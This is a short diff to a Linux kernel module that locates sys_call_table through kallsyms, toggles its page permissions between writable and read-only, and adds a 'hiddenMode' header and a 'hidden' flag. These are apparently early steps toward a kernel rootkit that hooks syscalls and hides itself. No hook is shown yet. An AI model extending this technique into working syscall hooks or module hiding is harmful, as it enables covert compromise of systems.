@@ -3,7 +3,9 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/kallsyms.h>
+#include <linux/delay.h>
 #include "changePagesPermission.h"
+#include "hiddenMode.h"
 
 
 MODULE_LICENSE("GPL");
@@ -18,6 +20,7 @@ module_param(kallsyms_lookup_addr, ulong, S_IRUGO);
 
 unsigned long (*kallsyms_lookup_func)(const char *name);
 unsigned long *sys_call_table;
+static int hidden = 0;
 
 static int __init example_init(void)
 {
@@ -28,7 +31,7 @@ static int __init example_init(void)
     int rw_res = modify_to_rw_permissions((unsigned long)sys_call_table);
     printk(KERN_INFO "Changed to RW!  %d\n", rw_res);
     int ro_res = modify_to_ro_permissions((unsigned long)sys_call_table);
-    printk(KERN_INFO "Changed to RO!  %d\n", ro_res);   
+    printk(KERN_INFO "Changed to RO!  %d\n", ro_res); 
     return 0;
 }
 
